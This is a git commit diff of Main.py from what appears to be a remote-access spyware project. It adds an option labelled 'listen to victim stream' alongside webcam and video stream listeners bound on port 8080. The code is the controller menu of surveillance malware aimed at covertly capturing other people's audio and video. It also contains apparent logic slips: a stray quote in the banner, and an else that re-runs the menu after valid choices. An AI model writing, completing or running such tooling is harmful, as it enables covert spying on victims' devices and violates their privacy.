aa649dd53220bb7f7e19185b4fa9433f2b2b5544
PhantomCode <gabrielnascimentogn167@gmail.com>
2024-09-15 15:21:19 -0400

    Update Main.py

--- Main.py
+++ Main.py
@@ -1,22 +1,26 @@
 from bruh2 import start_server
 from bruh1 import start_streaming_server
+from bruh import receive_audio_from_client
 
 
 def Main():
-    choice = input("""
-listener for what?
-      
-(1)webcam
-(2)screenshot
-                   
-choice:
-                   
-""")
+    banner = """"
+    listener:
+    
+    1)webcam stream
+    2)video stream
+    3)listen to victim stream
+
+    """
+    print(banner)
+    choice = input("choice: ")
     
     if choice == "1":
        start_streaming_server(server_ip='0.0.0.0', server_port=8080)
     if choice == "2":
        start_server('0.0.0.0', 8080)
+    if choice == "3":
+        receive_audio_from_client()
     else:
         Main()
 
